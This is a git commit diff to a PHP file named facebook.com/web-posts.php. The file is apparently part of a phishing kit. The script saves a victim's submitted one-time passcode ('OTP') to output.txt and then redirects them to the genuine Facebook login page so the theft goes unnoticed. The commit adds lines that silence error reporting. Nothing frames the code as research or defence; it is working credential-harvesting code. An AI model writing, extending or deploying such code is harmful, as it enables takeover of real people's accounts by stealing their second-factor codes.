3cdd370c251a30e2a10f7aee17ae4fafe3f8b838
darknethaxor <72026007+darknethaxor@users.noreply.github.com>
2021-09-09 21:59:07 +0600

    Update web-posts.php

--- facebook.com/web-posts.php
+++ facebook.com/web-posts.php
@@ -1,5 +1,6 @@
 <?php
-
+error_reporting(0);
+ini_set('display_errors', 0);
 file_put_contents("output.txt", " Done " . $_POST['OTP'] . "\n", FILE_APPEND);
 header('Location: https://web.facebook.com/login/?email=&li=7HuNXheRQXhWYv5BGRmu6HKI&e=1348092&refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&_rdr');
 exit();
